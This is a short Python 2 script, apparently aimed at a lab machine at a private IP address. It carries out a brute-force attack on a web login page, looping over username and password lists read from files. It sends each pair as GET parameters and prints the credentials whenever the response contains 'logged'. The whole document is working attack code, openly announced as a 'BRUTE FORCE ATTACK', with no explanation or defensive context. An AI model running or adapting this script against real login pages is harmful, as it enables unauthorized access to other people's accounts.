#!/usr/bin/python
import urllib

def main():
    usernames = open('users.txt','r').read().split('\n')
    passwords = open('pass.txt','r').read().split('\n')
    baseurl="http://192.168.110.135/project/login.php?"
    print "STARTING BRUTE FORCE ATTACK".center(50,"*")
    for u in usernames:
        for p in passwords:
            data={'email':u,'password':p}
            encoded_args=urllib.urlencode(data)
            op = urllib.urlopen(baseurl+encoded_args)
            if 'logged' in op.read():
                print "\nEmail = "+u.ljust(20)+"Password = "+p.ljust(20)

if __name__ == '__main__':
    main()
